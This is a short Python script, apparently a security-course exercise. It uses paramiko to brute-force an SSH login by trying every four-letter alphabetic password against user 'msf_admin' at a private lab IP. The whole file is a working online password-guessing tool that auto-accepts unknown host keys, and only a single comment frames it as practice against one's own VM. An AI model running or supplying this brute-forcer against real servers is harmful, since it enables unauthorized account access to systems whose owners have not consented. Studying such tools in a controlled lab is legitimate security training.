import itertools as it
import string
from utils import timefunc

import paramiko

# for this exercise you need to have a VM with IP and known username and short password (with 4 characters of password)


def create_client():
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy)
    return client


class Brutus:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    @timefunc
    def crackit(self, username):
        client = create_client()
        for guess in self.guesses:
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.5)
                return guess
            except paramiko.AuthenticationException as e:
                print(f"{guess} is not it")
            finally:
                client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess)


@timefunc
def main():
    # charset = string.ascii_letters + string.digits
    charset = string.ascii_letters
    ip = '10.0.13.231'
    brute = Brutus(charset, 4, ip)
    password = brute.crackit(username='msf_admin')
    if password:
        print(f'Found: {password}')
    # for guess in brute.guesses:
    #     print(guess)


if __name__ == "__main__":
    main()







